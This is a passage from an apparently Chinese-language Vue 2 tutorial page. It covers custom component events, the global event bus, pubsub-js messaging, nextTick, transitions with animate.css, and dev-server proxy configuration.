class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                name:<span class="string">&#x27;张三&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">sendStudentlName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//触发Student组件实例身上的atguigu事件</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$emit(<span class="string">&#x27;atguigu&#x27;</span>,<span class="built_in">this</span>.name,<span class="number">666</span>,<span class="number">888</span>,<span class="number">900</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><ol><li><p>第二种方式，在父组件中：</p><p>触发自定义事件：<code>this.$emit(&#39;atguigu&#39;,数据)</code>    </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ===&gt;父组件&lt;=== --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Student</span> <span class="attr">ref</span>=<span class="string">&quot;student&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> Student <span class="keyword">from</span> <span class="string">&#x27;./components/Student&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">        components:&#123;School&#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                msg:<span class="string">&#x27;你好啊！&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">getStudentName</span>(<span class="params">name,...params</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;App收到了学生名：&#x27;</span>,name,params)</span></span><br><span class="line">            &#125;,  </span><br><span class="line">        &#125;,</span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">this</span>.$refs.student.$on(<span class="string">&#x27;atguigu&#x27;</span>,<span class="built_in">this</span>.getStudentName)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ===&gt;子组件&lt;=== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendStudentlName&quot;</span>&gt;</span>把学生名给App<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                name:<span class="string">&#x27;张三&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">sendStudentlName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//触发Student组件实例身上的atguigu事件</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$emit(<span class="string">&#x27;atguigu&#x27;</span>,<span class="built_in">this</span>.name,<span class="number">666</span>,<span class="number">888</span>,<span class="number">900</span>)</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。    </p></li></ol><h1 id="组件自定义事件"><a href="#组件自定义事件" class="headerlink" title="组件自定义事件"></a>组件自定义事件</h1><ol><li><p>一种组件间通信的方式，适用于：<strong style="color:red">子组件 ===&gt; 父组件</strong></p></li><li><p>使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red">事件的回调在A中</span>）。</p></li><li><p>绑定自定义事件：</p><ol><li><p>第一种方式，在父组件中：<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>  或 <code>&lt;Demo v-on:atguigu=&quot;test&quot;/&gt;</code></p></li><li><p>第二种方式，在父组件中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Demo ref=<span class="string">&quot;demo&quot;</span>/&gt;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="built_in">this</span>.$refs.xxx.$on(<span class="string">&#x27;atguigu&#x27;</span>,<span class="built_in">this</span>.test)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p></li></ol></li><li><p>触发自定义事件：<code>this.$emit(&#39;atguigu&#39;,数据)</code>        </p></li><li><p>解绑自定义事件<code>this.$off(&#39;atguigu&#39;)</code></p></li><li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符。</p></li><li><p>注意：通过<code>this.$refs.xxx.$on(&#39;atguigu&#39;,回调)</code>绑定自定义事件时，回调<span style="color:red">要么配置在methods中</span>，<span style="color:red">要么用箭头函数</span>，否则this指向会出问题！</p></li></ol><h3 id="解绑自定义事件"><a href="#解绑自定义事件" class="headerlink" title="解绑自定义事件"></a>解绑自定义事件</h3><p>解绑自定义事件<code>this.$off(&#39;atguigu&#39;)</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- ===&gt;父组件&lt;=== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Student</span> @<span class="attr">atguigu</span>=<span class="string">&quot;getStudentName&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">import</span> Student <span class="keyword">from</span> <span class="string">&#x27;./components/Student&#x27;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;App&#x27;</span>,</span></span><br><span class="line">        components:&#123;School&#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">getSchoolName</span>(<span class="params">name</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="string">&#x27;App收到了学校名：&#x27;</span>,name)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ===&gt;子组件&lt;=== --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;sendStudentlName&quot;</span>&gt;</span>把学生名给App<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;unbind&quot;</span>&gt;</span>解绑atguigu事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="javascript">        name:<span class="string">&#x27;Student&#x27;</span>,</span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="title">data</span>(<span class="params"></span>)</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">                name:<span class="string">&#x27;张三&#x27;</span></span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">sendStudentlName</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">//触发Student组件实例身上的atguigu事件</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$emit(<span class="string">&#x27;atguigu&#x27;</span>,<span class="built_in">this</span>.name,<span class="number">666</span>,<span class="number">888</span>,<span class="number">900</span>)</span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            <span class="function"><span class="title">unbind</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$off(<span class="string">&#x27;atguigu&#x27;</span>) <span class="comment">//解绑一个自定义事件</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// this.$off([&#x27;atguigu&#x27;,&#x27;demo&#x27;]) //解绑多个自定义事件</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// this.$off() //解绑所有的自定义事件</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">this</span>.$destroy() <span class="comment">//销毁了当前Student组件的实例，销毁后所有Student实例的自定义事件全都不奏效。</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="全局事件总线（GlobalEventBus）"><a href="#全局事件总线（GlobalEventBus）" class="headerlink" title="全局事件总线（GlobalEventBus）"></a>全局事件总线（GlobalEventBus）</h1><p>傀儡满足的条件：</p><ol><li>所有组件都能看到傀儡组件</li><li>所有组件都有$on,$emit,$off</li></ol><p>![]image-20220517172911394.png)</p><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>安装全局事件总线：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="title">beforeCreate</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">Vue.prototype.$bus = <span class="built_in">this</span> <span class="comment">//安装全局事件总线，$bus就是当前应用的vm</span></span><br><span class="line">&#125;,</span><br><span class="line">    ......</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure></li><li><p>使用事件总线：</p><ol><li><p>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red">回调留在A组件自身。</span></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">methods:&#123;</span><br><span class="line">    <span class="function"><span class="title">demo</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;拿到B组件提供的数据为：&quot;</span>,data)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$bus.$on(<span class="string">&#x27;xxxx&#x27;</span>,<span class="built_in">this</span>.demo)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>提供数据：<code>this.$bus.$emit(&#39;xxxx&#39;,数据)</code>,B组件提供数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">data</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    retuen&#123;</span><br><span class="line">        name:<span class="string">&quot;ccy&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.$bus.$emit(<span class="string">&#x27;xxxx&#x27;</span>,<span class="built_in">this</span>.name)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>最好在beforeDestroy钩子中，用$off去解绑<span style="color:red">当前组件所用到的</span>事件。在接收数据的组件中解绑自定义事件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">beforeDestroy</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">this</span>.$bus.$off(<span class="string">&quot;xxxx&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="消息订阅与发布（pubsub）"><a href="#消息订阅与发布（pubsub）" class="headerlink" title="消息订阅与发布（pubsub）"></a>消息订阅与发布（pubsub）</h1><ol><li><p>一种组件间通信的方式，适用于<span style="color:red">任意组件间通信</span>。</p></li><li><p>使用步骤：</p><ol><li><p>安装pubsub：<code>npm i pubsub-js</code></p></li><li><p>引入: <code>import pubsub from &#39;pubsub-js&#39;</code></p></li><li><p>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red">回调留在A组件自身。</span></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">methods</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="function"><span class="title">demo</span>(<span class="params">msgName,data</span>)</span>&#123;......&#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line"><span class="function"><span class="title">mounted</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.pid = pubsub.subscribe(<span class="string">&#x27;xxx&#x27;</span>,<span class="built_in">this</span>.demo) <span class="comment">//订阅消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>提供数据：<code>pubsub.publish(&#39;xxx&#39;,数据)</code></p></li><li><p>最好在beforeDestroy钩子中，用<code>PubSub.unsubscribe(pid)</code>去<span style="color:red">取消订阅。</span></p></li></ol></li></ol><h1 id="nextTick"><a href="#nextTick" class="headerlink" title="nextTick"></a>nextTick</h1><ol><li>语法：<code>this.$nextTick(回调函数)</code></li><li>作用：在下一次 DOM 更新结束后执行其指定的回调。</li><li>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</li></ol><h1 id="Vue封装的过度与动画"><a href="#Vue封装的过度与动画" class="headerlink" title="Vue封装的过度与动画"></a>Vue封装的过度与动画</h1><ol><li><p>作用：在插入、更新或移除 DOM元素时，在合适的时候给元素添加样式类名。</p></li><li><p>图示：</p><p><img src="image-20220518124915969.png" alt=""></p></li><li><p>写法：</p><ol><li><p>准备好样式：</p><ul><li>元素进入的样式：<ol><li>v-enter：进入的起点</li><li>v-enter-active：进入过程中</li><li>v-enter-to：进入的终点</li></ol></li><li>元素离开的样式：<ol><li>v-leave：离开的起点</li><li>v-leave-active：离开过程中</li><li>v-leave-to：离开的终点</li></ol></li></ul></li><li><p>使用<code>&lt;transition&gt;</code>包裹要过度的元素，并配置name属性（transition配置了name=”hello”，则v-enter要改为hello-enter）,其他的也一样：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- appear:自动执行动画 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">name</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">appear</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="css">    <span class="comment">/* 进入的起点、离开的终点 */</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.hello-enter</span>,<span class="selector-class">.hello-leave-to</span>&#123;</span></span><br><span class="line">        transform: translateX(-100%);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="selector-class">.hello-enter-active</span>,<span class="selector-class">.hello-leave-active</span>&#123;</span></span><br><span class="line">        transition: 0.5s linear;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="css">    <span class="comment">/* 进入的终点、离开的起点 */</span></span></span><br><span class="line"><span class="css">    <span class="selector-class">.hello-enter-to</span>,<span class="selector-class">.hello-leave</span>&#123;</span></span><br><span class="line">        transform: translateX(0);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>备注：若有多个元素需要过度，则需要使用：<code>&lt;transition-group&gt;</code>，且每个元素都要指定<code>key</code>值。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition-group</span> <span class="attr">name</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">appear</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;!isShow&quot;</span> <span class="attr">key</span>=<span class="string">&quot;2&quot;</span>&gt;</span>你不大好啊！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="利用第三方-库：animate-css"><a href="#利用第三方-库：animate-css" class="headerlink" title="利用第三方 库：animate.css"></a>利用第三方 库：animate.css</h3><p>网址：<a href="https://animate.style/">https://animate.style/</a></p><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install animate.css --save</span><br></pre></td></tr></table></figure><p>将其导入到您的文件中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;animate.css&#x27;</span>;</span><br></pre></td></tr></table></figure><p>在.vue文件中使用：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">transition</span> <span class="attr">appear</span></span></span><br><span class="line"><span class="tag">            <span class="attr">name</span>=<span class="string">&quot;animate__animated animate__bounce&quot;</span> </span></span><br><span class="line"><span class="tag">            <span class="attr">enter-active-class</span>=<span class="string">&quot;animate__swing&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">leave-active-class</span>=<span class="string">&quot;animate__backOutUp&quot;</span></span></span><br><span class="line"><span class="tag">            &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>你好啊！<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">transition</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="vue脚手架配置代理"><a href="#vue脚手架配置代理" class="headerlink" title="vue脚手架配置代理"></a>vue脚手架配置代理</h1><p>安装axios</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i axios</span><br></pre></td></tr></table></figure><p>导入axios</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>​    在vue.config.js中添加如下配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">devServer:&#123;</span><br><span class="line">  proxy:<span class="string">&quot;http://localhost:5000&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说明：</p><ol><li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li><li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li><li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li></ol><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>​    编写vue.config.js配置具体代理规则：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    devServer: &#123;</span><br><span class="line">        proxy: &#123;</span><br><span class="line">            <span class="string">&#x27;/api1&#x27;</span>: &#123;<span class="comment">// 匹配所有以 &#x27;/api1&#x27;开头的请求路径http://localhost:8080/api1/文件路径</span></span><br><span class="line">                target: <span class="string">&#x27;http://localhost:5000&#x27;</span>,<span class="comment">// 代理目标的基础路径</span></span><br><span class="line">                changeOrigin: <span class="literal">true</span>,</span><br><span class="line">                pathRewrite: &#123;<span class="string">&#x27;^/api1&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;<span class="comment">//请求到另一个服务器上，将/api1改为空，例如：本地请求：http://localhost:8080/api1/student,另一个服务器地址：http://localhost:5000/student</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&#x27;/api2&#x27;</span>: &#123;<span class="comment">// 匹配所有以 &#x27;/api2&#x27;开头的请求路径</span></span><br><span class="line">                target: <span class="string">&#x27;http://localhost:5001&#x27;</span>,<span class="comment">// 代理目标的基础路径</span></span><br><span class="line">                changeOrigin: <span class="literal">true</span>,</span><br><span class="line">                pathRewrite: &#123;<span class="string">&#x27;^/api2&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000（这是另一个服务器的）</span></span><br><span class="line"><span class="comment">   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080（这是本地服务器的）</span></span><br><span class="line"><span class="comment">   changeOrigin默认值为true</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>说明：</p><ol><li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li><li>缺点：配置略微繁琐，请求资源时必须加前缀。</li></ol><h1 id="vue-resource（了解即可）"><a href="#vue-resource（了解即可）" class="headerlink" title="vue-resource（了解即可）"></a>vue-resource（了解即可）</h1><p>安装vue-resource（官方也不维护了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i vue-resource</span><br></pre></td></tr></table></figure><p>在main.js文件中导入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vueResource <span class="keyword">from</span> <span class="string">&#x27;vue-resource&#x27;</span></span><br><span class="line">Vue.use(vueResource)</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 